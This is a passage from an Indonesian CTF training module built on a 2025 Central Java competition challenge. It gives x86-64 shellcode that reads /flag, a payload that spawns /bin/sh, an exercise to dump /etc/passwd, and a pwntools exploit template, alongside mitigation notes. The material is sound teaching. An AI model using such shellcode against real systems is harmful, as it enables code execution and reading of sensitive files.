    ["./main", compiled_code.hex()],  # Jalankan binary dengan shellcode
    stderr=subprocess.STDOUT,
    timeout=2
)
```

### Strategi Eksploitasi

**Tujuan**: Mendapatkan flag dari server

**Cara 1: Baca file flag langsung**

Kirim assembly code yang melakukan syscall `open`/`read`/`write` untuk membaca dan menampilkan isi file flag:

```asm
; Shellcode x86-64 untuk read("/flag", buf, 100)
; dan write(1, buf, 100)

; === open("/flag", O_RDONLY) ===
lea rdi, [rip+flag_path]  ; rdi = pointer ke "/flag"
xor rsi, rsi              ; rsi = O_RDONLY (0)
xor rdx, rdx              ; rdx = mode (0)
mov rax, 2                ; syscall: open
syscall                   ; rax = file descriptor

; === read(fd, buf, 100) ===
mov rdi, rax              ; rdi = file descriptor
sub rsp, 100              ; buat buffer di stack
mov rsi, rsp              ; rsi = buffer
mov rdx, 100              ; rdx = ukuran
mov rax, 0                ; syscall: read
syscall                   ; rax = bytes read

; === write(1, buf, bytes_read) ===
mov rdx, rax              ; rdx = bytes yang dibaca
mov rdi, 1                ; rdi = stdout
mov rax, 1                ; syscall: write
syscall

; === exit(0) ===
xor rdi, rdi
mov rax, 60               ; syscall: exit
syscall

flag_path:
.string "/flag"
```

**Cara 2: Spawn reverse shell**

```asm
; Execve /bin/sh untuk spawn shell
mov rax, 59              ; execve
lea rdi, [rip+sh]        ; "/bin/sh"
xor rsi, rsi             ; argv = NULL
xor rdx, rdx             ; envp = NULL
syscall

sh: .string "/bin/sh"
```

### Linux x86-64 Syscall Table (Penting)

| Syscall | RAX | Argumen |
|---------|-----|---------|
| read    | 0   | rdi=fd, rsi=buf, rdx=count |
| write   | 1   | rdi=fd, rsi=buf, rdx=count |
| open    | 2   | rdi=path, rsi=flags, rdx=mode |
| execve  | 59  | rdi=path, rsi=argv, rdx=envp |
| exit    | 60  | rdi=exit_code |

### Catatan Keamanan

Soal ini dengan sengaja dirancang vulnerable untuk tujuan pembelajaran. Dalam dunia nyata, mengeksekusi kode arbitrary yang dikirim pengguna adalah kerentanan kritis. Mitigasinya antara lain:
- Sandboxing dengan seccomp (membatasi syscall yang diizinkan)
- Menjalankan dalam container/VM terisolasi
- Whitelist syscall yang diizinkan
- Validasi dan pembatasan input assembly yang ketat

---

## Latihan Mandiri – Boot2Root

1. Tulis shellcode x86-64 untuk menulis string "Hello, World!" ke stdout menggunakan syscall `write`
2. Compile dan jalankan shellcode menggunakan format hex yang diterima program `main.c`
3. Modifikasi shellcode untuk membaca dan mencetak isi file `/etc/passwd`

---

---

# PENUTUP: STRATEGI KOMPETISI CTF

## Tips Umum CTF

**1. Metodologi Sistematis**
- Baca setiap soal dengan cermat sebelum mulai
- Identifikasi kategori dan teknik yang mungkin digunakan
- Jangan menghabiskan terlalu lama pada satu soal — lanjut ke soal lain

**2. Prioritas Poin**
- Selesaikan soal termudah dulu (quick wins)
- Soal dengan nilai lebih tinggi biasanya lebih kompleks
- Catat semua temuan meski belum menemukan flag

**3. Tools yang Wajib Disiapkan**

```bash
# Install semua tools sebelum kompetisi
pip install pwntools randcrack
sudo apt install gdb binutils python3-gmpy2
sudo apt install binwalk foremost exiftool steghide
```

**4. Template Script Dasar**

```python
#!/usr/bin/env python3
from pwn import *

# atur konteks
context.arch = 'amd64'
context.log_level = 'debug'  # ubah ke 'info' untuk output lebih bersih

# pilih target
LOCAL = True
if LOCAL:
    p = process('./chall')
else:
    p = remote('target.host', 1234)

# fungsi helper
def send_payload(payload):
    p.sendline(payload)
    return p.recvline()

# exploit
# ... kode exploit di sini ...

p.interactive()
```

## Referensi Belajar

| Sumber | URL | Topik |
|--------|-----|-------|
| CTFtime | https://ctftime.org | Kalender CTF, writeup |
| PicoCTF | https://picoctf.org | CTF untuk pemula |
| pwn.college | https://pwn.college | Binary Exploitation |
| HackTheBox | https://hackthebox.com | Boot2Root, Web |
| CryptoHack | https://cryptohack.org | Kriptografi |
| OWASP | https://owasp.org | Web Security |
| LiveOverflow | YouTube | Video tutorial CTF |

---

*Modul ini disusun berdasarkan soal-soal dari repository resmi LKS-ID/2025-LKSP-Jawa-Tengah-Public. Seluruh teknik dalam modul ini hanya untuk tujuan pembelajaran dan kompetisi yang sah.*

